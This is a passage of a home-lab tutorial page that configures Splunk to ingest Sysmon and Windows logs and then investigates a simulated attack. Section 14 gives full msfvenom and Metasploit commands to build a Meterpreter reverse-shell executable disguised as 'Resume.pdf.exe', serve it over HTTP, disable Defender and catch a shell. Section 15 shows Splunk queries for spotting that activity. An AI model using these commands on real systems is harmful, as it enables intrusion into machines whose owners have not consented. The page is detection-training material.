+[blacklist:$SPLUNK_HOME\etc\auth]
+
+[blacklist:$SPLUNK_HOME\etc\passwd]
+
+[monitor://$SPLUNK_HOME\var\log\splunk]
+index = _internal
+
+[monitor://$SPLUNK_HOME\var\log\watchdog\watchdog.log*]
+index = _internal
+
+[monitor://$SPLUNK_HOME\var\log\splunk\license_usage_summary.log]
+index = _telemetry
+
+[monitor://$SPLUNK_HOME\var\log\splunk\splunk_instrumentation_cloud.log*]
+index = _telemetry
+sourcetype = splunk_cloud_telemetry
+
+[monitor://$SPLUNK_HOME\etc\splunk.version]
+_TCP_ROUTING = *
+index = _internal
+sourcetype=splunk_version
+
+[monitor://$SPLUNK_HOME\var\log\splunk\configuration_change.log]
+index = _configtracker
+
+[batch://$SPLUNK_HOME\var\run\splunk\search_telemetry\*search_telemetry.json]
+move_policy = sinkhole
+index = _introspection
+sourcetype = search_telemetry
+crcSalt = &lt;SOURCE&gt;
+log_on_completion = 0
+
+[batch://$SPLUNK_HOME\var\spool\splunk]
+move_policy = sinkhole
+crcSalt = &lt;SOURCE&gt;
+
+[batch://$SPLUNK_HOME\var\spool\splunk\tracker.log*]
+index = _internal
+sourcetype = splunkd_latency_tracker
+move_policy = sinkhole
+
+[batch://$SPLUNK_HOME\var\spool\splunk\...stash_new]
+queue       = stashparsing
+sourcetype  = stash_new
+move_policy = sinkhole
+crcSalt     = &lt;SOURCE&gt;
+time_before_close = 0
+
+[batch://$SPLUNK_HOME\var\spool\splunk\...stash_hec]
+sourcetype  = stash_hec
+move_policy = sinkhole
+crcSalt     = &lt;SOURCE&gt;
+
+[fschange:$SPLUNK_HOME\etc]
+disabled = false
+#poll every 10 minutes
+pollPeriod = 600
+#generate audit events into the audit index, instead of fschange events
+signedaudit=true
+recurse=true
+followLinks=false
+hashMaxSize=-1
+fullEvent=false
+sendEventMaxSize=-1
+filesPerDelay = 10
+delayInMills = 100
+
+[udp]
+connection_host=ip
+
+[tcp]
+acceptFrom=*
+connection_host=dns
+
+[splunktcp]
+route=has_key:_replicationBucketUUID:replicationQueue;has_key:_dstrx:typingQueue;has_key:_linebreaker:rulesetQueue;absent_key:_linebreaker:parsingQueue
+acceptFrom=*
+connection_host=ip
+
+logRetireOldS2S = true
+logRetireOldS2SRepeatFrequency = 1d
+logRetireOldS2SMaxCache = 10000
+
+[script]
+interval = 60.0
+start_by_shell = false
+
+[SSL]
+# SSL settings
+# The following provides modern TLS configuration that guarantees forward-
+# secrecy and efficiency. This configuration drops support for old Splunk
+# versions (Splunk 5.x and earlier).
+# To add support for Splunk 5.x set sslVersions to tls and add this to the
+# end of cipherSuite:
+#     DHE-RSA-AES256-SHA:AES256-SHA:DHE-RSA-AES128-SHA:AES128-SHA
+# and this, in case Diffie Hellman is not configured:
+#     AES256-SHA:AES128-SHA
+
+sslVersions = tls1.2
+cipherSuite = ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA256
+ecdhCurves = prime256v1, secp384r1, secp521r1
+
+allowSslRenegotiation = true
+sslQuietShutdown = false
+logCertificateData = true
+certLogMaxCacheEntries = 10000
+certLogRepeatFrequency = 1d
+
+
+[script://$SPLUNK_HOME\bin\scripts\splunk-wmi.path]
+disabled = 0
+interval = 10000000
+source = wmi
+sourcetype = wmi
+queue = winparsing
+persistentQueueSize=200MB
+
+# default single instance modular input restarts
+
+[admon]
+interval=60
+baseline=0
+
+[MonitorNoHandle]
+interval=60
+
+[WinEventLog]
+interval=60
+evt_resolve_ad_obj = 0
+evt_dc_name=
+evt_dns_name=
+
+[WinNetMon]
+interval=60
+
+[WinPrintMon]
+interval=60
+
+[WinRegMon]
+interval=60
+baseline=0
+
+[perfmon]
+interval=300
+
+[powershell]
+interval=60
+
+[powershell2]
+interval=60
+
+[WinEventLog://Microsoft-Windows-Sysmon/Operational]
+index = endpoint
+disabled = false
+renderXml = true
+source = XmlWinEventLog:Microsoft-Windows-Sysmon/Operational
+
+[WinEventLog://Microsoft-Windows-Windows Defender/Operational]
+index = endpoint
+disabled = false
+source = Microsoft-Windows-Windows Defender/Operational
+blacklist = 1151,1150,2000,1002,1001,1000
+
+[WinEventLog://Microsoft-Windows-PowerShell/Operational]
+index = endpoint
+disabled = false
+source = Microsoft-Windows-PowerShell/Operational
+blacklist = 4100,4105,4106,40961,40962,53504
+
+[WinEventLog://Application]
+index = endpoint
+disabled = false
+
+[WinEventLog://Security]
+index = endpoint
+disabled = false
+
+[WinEventLog://System]
+index = endpoint
+disabled = false
+</code></pre><ol start="4">
+<li>Save and close the file.</li>
+</ol>
+<p>This configuration ensures that Splunk is correctly set up to collect all relevant Sysmon logs using the lab&rsquo;s custom settings.</p>
+<hr>
+<p>Here&rsquo;s your full rewritten and <strong>neatly organized</strong> note with all points preserved, formatted clearly for ease of understanding and reference during your lab work or demonstrations:</p>
+<hr>
+<h2 id="14-malware-generation-and-handler-setup-using-metasploit">14 <strong>Malware Generation and Handler Setup Using Metasploit</strong></h2>
+<h3 id="-step-1-get-the-ip-address-of-your-kali-machine">📌 Step 1: Get the IP Address of Your Kali Machine</h3>
+<p>We need the <strong>IP address</strong> of our Kali (attacker) machine to configure the malware:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ifconfig     <span style="color:#75715e"># or use: ip a</span>
+</span></span></code></pre></div><p>👉 <strong>Take note of your IP address</strong> – we’ll use this as the <code>LHOST</code> value while generating the malware and setting up the listener.</p>
+<hr>
+<h3 id="-step-2-optional-nmap-reference">🔍 Step 2: Optional Nmap Reference</h3>
+<p>Familiarize yourself with <code>nmap</code> options:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -h
+</span></span></code></pre></div><p>Example usage:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -A 192.168.20.10 -Pn
+</span></span></code></pre></div><hr>
+<h3 id="-step-3-generate-malware-with-msfvenom">💣 Step 3: Generate Malware with <code>msfvenom</code></h3>
+<p>Explore available payloads:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfvenom -l payloads
+</span></span></code></pre></div><p>We&rsquo;ll use:</p>
+<pre tabindex="0"><code>windows/x64/meterpreter_reverse_tcp
+</code></pre><h3 id="malware-generation-command">Malware Generation Command:</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST<span style="color:#f92672">=</span>&lt;Kali IP&gt; LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span> -f exe -o Resume.pdf.exe
+</span></span></code></pre></div><p><strong>Example:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST<span style="color:#f92672">=</span>192.168.20.11 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span> -f exe -o Resume.pdf.exe
+</span></span></code></pre></div><ul>
+<li>
+<p>This creates a <strong>reverse shell payload</strong>.</p>
+</li>
+<li>
+<p>The output file <code>Resume.pdf.exe</code> will attempt to connect back to the attacker machine on port <strong>4444</strong> (default for Meterpreter).</p>
+</li>
+</ul>
+<p>Verify the file exists:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ls
+</span></span><span style="display:flex;"><span>file Resume.pdf.exe
+</span></span></code></pre></div><hr>
+<h3 id="-step-4-setup-a-listener-with-metasploit">🧲 Step 4: Setup a Listener with Metasploit</h3>
+<p>Launch Metasploit:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>msfconsole
+</span></span></code></pre></div><p>Select the <strong>multi/handler</strong> module:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>use exploit/multi/handler
+</span></span></code></pre></div><p>Show current options:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>options
+</span></span></code></pre></div><p>Note: The <strong>default payload</strong> is usually <code>generic/shell_reverse_tcp</code>. We’ll change it to match our malware:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>set payload windows/x64/meterpreter/reverse_tcp
+</span></span></code></pre></div><p>Press <code>Tab</code> if unsure—it helps autocomplete!</p>
+<p>Now re-check options:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>options
+</span></span></code></pre></div><p>Set the correct LHOST:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>set LHOST &lt;Kali IP&gt;
+</span></span><span style="display:flex;"><span>set LHOST 192.168.20.11
+</span></span></code></pre></div><p>Start the listener:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>exploit
+</span></span></code></pre></div><p>🎯 You are now listening for connections on port 4444.</p>
+<hr>
+<h3 id="-step-5-share-malware-via-http-server">🌐 Step 5: Share Malware via HTTP Server</h3>
+<p>In a <strong>new terminal tab</strong>, make sure you&rsquo;re in the same directory as <code>Resume.pdf.exe</code>, then start a Python HTTP server:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -m http.server <span style="color:#ae81ff">9999</span>
+</span></span></code></pre></div><p>✅ Use any available port (e.g., 9999).</p>
+<p>Your Kali machine is now hosting the malware at:</p>
+<pre tabindex="0"><code>http://192.168.20.11:9999
+</code></pre><hr>
+<h3 id="-step-6-on-the-windows-test-machine">🪟 Step 6: On the Windows Test Machine</h3>
+<ol>
+<li>
+<p><strong>Disable Windows Defender</strong>:</p>
+<ul>
+<li>
+<p>Go to:<br>
+<code>Windows Security &gt; Virus &amp; threat protection &gt; Manage Settings</code></p>
+</li>
+<li>
+<p>Turn off <strong>Real-time Protection</strong></p>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Open browser</strong> and visit:</p>
+<pre tabindex="0"><code>http://192.168.20.11:9999
+</code></pre></li>
+<li>
+<p>Download <code>Resume.pdf.exe</code>.<br>
+If you see a warning about the file not being commonly downloaded — ignore it <em>only for this lab</em>.</p>
+</li>
+<li>
+<p><strong>Run the file</strong>.<br>
+If Windows shows a warning, choose <strong>Run anyway</strong>.</p>
+</li>
+</ol>
+<hr>
+<h3 id="-step-7-confirm-the-connection">🧪 Step 7: Confirm the Connection</h3>
+<p>Open Command Prompt as Administrator and run:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>netstat -anob
+</span></span></code></pre></div><p>🔍 Look for:</p>
+<ul>
+<li>
+<p>An <strong>established connection</strong> to Kali’s IP:4444</p>
+</li>
+<li>
+<p>Check the <strong>Process ID</strong> (e.g., 10208)</p>
+</li>
+<li>
+<p>Open <strong>Task Manager &gt; Details</strong> tab, find that PID → it should be <code>Resume.pdf.exe</code></p>
+</li>
+</ul>
+<p>✅ If yes — your malware has executed successfully.</p>
+<hr>
+<h3 id="-step-8-back-on-kali--you-have-a-shell">💻 Step 8: Back on Kali – You Have a Shell!</h3>
+<p>In the <strong>Metasploit handler</strong>, you should now see a session opened.</p>
+<p>Type:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>help
+</span></span></code></pre></div><p>Try:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>shell        <span style="color:#75715e"># Spawn a shell on victim machine</span>
+</span></span></code></pre></div><p>Test with some useful commands:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>net user
+</span></span><span style="display:flex;"><span>net localgroup
+</span></span><span style="display:flex;"><span>ipconfig
+</span></span></code></pre></div><p>You&rsquo;re in! 🔓</p>
+<hr>
+<h2 id="15-investigating-attack-activity-in-splunk">15 Investigating Attack Activity in Splunk</h2>
+<p>Once you&rsquo;ve successfully ingested <strong>Sysmon logs</strong> into Splunk and executed the simulated attack (e.g., Nmap scan and <code>Resume.pdf.exe</code> malware), here’s how to investigate these activities:</p>
+<h3 id="-step-1-check-nmap-scan-activity">🔍 Step 1: Check Nmap Scan Activity</h3>
+<p>Run the following search in <strong>Splunk’s Search &amp; Reporting</strong> app:</p>
+<pre tabindex="0"><code class="language-spl" data-lang="spl">index=endpoint 192.168.20.11
+</code></pre><p>This query filters logs where your <strong>Kali machine’s IP</strong> appears (as attacker).</p>
+<ul>
+<li>
+<p>Under <strong>Fields</strong>, look for:</p>
+<ul>
+<li>
+<p><code>dest_port</code>: If you see only <strong>one port</strong> (e.g., <code>dest_port=3389</code>), ask:</p>
+<blockquote>
+<p><em>“Should this machine be connecting to our RDP port? Who owns this machine?”</em></p>
+</blockquote>
+</li>
+</ul>
+</li>
+</ul>
+<p>🧠 While this log shows an incoming connection attempt, <strong>Sysmon alone doesn&rsquo;t show full Nmap scan behavior</strong> (like sequential port scanning). That’s why:</p>
+<blockquote>
+<p>🛡️ It&rsquo;s highly recommended to have a <strong>network sensor</strong> (e.g., Zeek or Suricata) deployed between your machines. These can detect:</p>
+<ul>
+<li>
+<p>TCP flags</p>
+</li>
+<li>
+<p>Scanning patterns</p>
+</li>
+<li>
+<p>Protocol signatures</p>
+</li>
+</ul>
+</blockquote>
+<p>Without it, the telemetry is limited to what the endpoint sees—making it harder to distinguish between legitimate access and reconnaissance attempts.</p>
+<h3 id="-step-2-investigate-malware-execution-resumepdfexe">🦠 Step 2: Investigate Malware Execution (<code>Resume.pdf.exe</code>)</h3>
+<p>To check for events related to the <strong>malware file</strong>, run:</p>
+<pre tabindex="0"><code class="language-spl" data-lang="spl">index=endpoint Resume.pdf.exe
+</code></pre><p>This searches for all logs where the filename <code>Resume.pdf.exe</code> appears.</p>
+<ul>
+<li>
+<p>Under <strong>Fields</strong>, you’ll typically see multiple <strong>EventCodes</strong>, such as:</p>
+<ul>
+<li>
+<p><strong>EventCode 1</strong>: Process creation</p>
+</li>
+<li>
+<p><strong>EventCode 3</strong>: Network connection</p>
+</li>
+<li>
+<p><strong>EventCode 7</strong>: Image loaded</p>
+</li>
+<li>
+<p><strong>EventCode 11</strong>: File created</p>
+</li>
+<li>
+<p>(There may be more depending on your Sysmon config)</p>
+</li>
+</ul>
+</li>
+</ul>
+<p>These events give you visibility into what the malware did, such as:</p>
+<ul>
+<li>
+<p>Which process launched it</p>
+</li>
+<li>
+<p>What files it accessed</p>
+</li>
+<li>
+<p>If it initiated a network connection (like reverse TCP)</p>
+</li>
+<li>
+<p>Which DLLs or system files it loaded</p>
+</li>
+</ul>
+<p>This is <strong>crucial</strong> for understanding malware behavior post-execution.</p>
+<h3 id="-summary">✅ Summary</h3>
+<table>
+<thead>
+<tr>
+<th>Action</th>
+<th>Splunk Query</th>
+<th>What to Look For</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Detect Nmap activity</td>
+<td><code>index=endpoint 192.168.20.11</code></td>
+<td>Check <code>dest_port</code>, assess if access was suspicious</td>
+</tr>
+<tr>
+<td>Investigate malware</td>
+<td><code>index=endpoint Resume.pdf.exe</code></td>
+<td>Review EventCodes (1, 3, 7, 11), trace malware actions</td>
+</tr>
+<tr>
+<td>Improve visibility</td>
+<td>—</td>
+<td>Deploy a <strong>network sensor</strong> for full scan detection &amp; TCP analysis</td>
+</tr>
+</tbody>
+</table>
+<hr>
+</article>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </main>
+</div>
+<script type="application/javascript" src='http://localhost:1313/js/toc.js'></script>
+<link rel="stylesheet" href='http://localhost:1313/css/toc.css' />
+
+  
+</div>
+
+  <div class="footer container-xl width-full p-responsive">
+  <div
+    class="position-relative d-flex flex-row-reverse flex-lg-row flex-wrap flex-lg-nowrap flex-justify-center flex-lg-justify-between flex-sm-items-center pt-6 pb-2 mt-6 f6 text-gray border-top border-gray-light ">
+    <a aria-label="Homepage" title="GitHub" class="footer-octicon d-none d-lg-block mr-lg-4" href="http://localhost:1313/">
+      <svg height="24" class="octicon octicon-mark-github" viewBox="0 0 16 16" version="1.1" width="24">
+        <path fill-rule="evenodd"
+          d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z">
+        </path>
+      </svg>
+    </a>
+    <ul class="list-style-none d-flex flex-wrap col-12 flex-justify-center flex-lg-justify-between mb-2 mb-lg-0">
+      
+      <li class="mr-3 mr-lg-0">Theme by <a href='https://github.com/MeiK2333/github-style'>github-style</a></li>
+      
+      <li class="mr-3 mr-lg-0">GitHub and the Invertocat logo are trademarks of <a href="https://github.com/">GitHub, Inc.</a></li>
+    </ul>
+  </div>
+  <div class="d-flex flex-justify-center pb-6">
+    <span class="f6 text-gray-light"></span>
+  </div>
+
+
+</div>
+
+</body>
+
+<script type="application/javascript" src="http://localhost:1313/js/github-style.js"></script>
+
+
+
+
+
+
+
+</html>
